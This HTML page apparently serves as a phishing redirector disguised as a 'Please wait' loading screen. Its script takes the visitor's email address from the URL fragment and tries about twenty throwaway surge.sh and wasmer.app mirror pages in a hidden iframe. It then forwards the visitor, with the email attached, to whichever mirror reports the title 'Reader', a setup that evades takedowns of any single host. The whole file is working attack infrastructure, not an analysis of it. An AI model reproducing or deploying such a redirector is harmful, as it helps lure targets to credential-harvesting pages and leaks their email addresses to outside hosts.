<!DOCTYPE html>
<html>
<head>
  <title>Please wait...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      background-color: #f4f4f4;
    }
    #message {
      font-size: 1.5em;
      margin-bottom: 20px;
    }
    #dots span {
      display: inline-block;
      animation: blink 1s infinite;
      margin: 0 2px;
    }
    #dots span:nth-child(2) { animation-delay: 0.2s; }
    #dots span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 50%, 100% { opacity: 0; }
      25%, 75% { opacity: 1; }
    }

    /* Hidden iframe */
    #tester {
      display: none;
      width: 0;
      height: 0;
      border: 0;
    }
  </style>
</head>
<body>
  <div id="message">Please wait<span id="dots"><span>.</span><span>.</span><span>.</span></span></div>
  <iframe id="tester"></iframe>

  <script>
    const links = [
      "https://mywebsite-uploaded.surge.sh/main.html",
      "https://backup1.surge.sh/main.html",
      "https://backup2.surge.sh/main.html",
      "https://backup3.surge.sh/main.html",
      "https://backup4.surge.sh/main.html",
      "https://backup5.surge.sh/main.html",
      "https://backup6.surge.sh/main.html",
      "https://backup7.surge.sh/main.html",
      "https://staticfile-f6355.wasmer.app/index.html",
      "https://staticfile-7aa78.wasmer.app/index.html",
      "https://staticfile-385f0.wasmer.app/index.html",
      "https://backup11.surge.sh/main.html",
      "https://backup12.surge.sh/main.html",
      "https://backup13.surge.sh/main.html",
      "https://backup14.surge.sh/main.html",
      "https://backup15.surge.sh/main.html",
      "https://backup16.surge.sh/main.html",
      "https://backup17.surge.sh/main.html",
      "https://staticfile-8e115.wasmer.app/index.html",
      "https://staticfile-e2d23.wasmer.app/index.html"
    ];

    const email = window.location.hash.substring(1);
    const jargon = Math.random().toString(36).substring(2,12);
    const messageEl = document.getElementById("message");
    const iframe = document.getElementById("tester");

    // Shuffle array for random order
    function shuffle(arr) {
      const a = arr.slice();
      for (let i = a.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [a[i], a[j]] = [a[j], a[i]];
      }
      return a;
    }

    const shuffledLinks = shuffle(links);

    let index = 0;

    function tryNextLink() {
      if (index >= shuffledLinks.length) {
        messageEl.textContent = "All links are down!";
        return;
      }

      const url = shuffledLinks[index] + "#" + email + "-" + jargon;
      messageEl.textContent = `Checking ${url}…`;
      iframe.src = url;

      // Wait 3 seconds for the iframe to load and check title
      setTimeout(() => {
        try {
          const title = iframe.contentDocument?.title;
          if (title === "Reader") {
            messageEl.textContent = `Redirecting to ${shuffledLinks[index]}…`;
            window.location.href = url;
          } else {
            index++;
            tryNextLink();
          }
        } catch {
          // Cross-origin error, assume link works (or skip)
          index++;
          tryNextLink();
        }
      }, 3000);
    }

    // Start redirect after initial animation wait
    window.addEventListener("DOMContentLoaded", () => {
      setTimeout(tryNextLink, 3000);
    });
  </script>
</body>
</html>
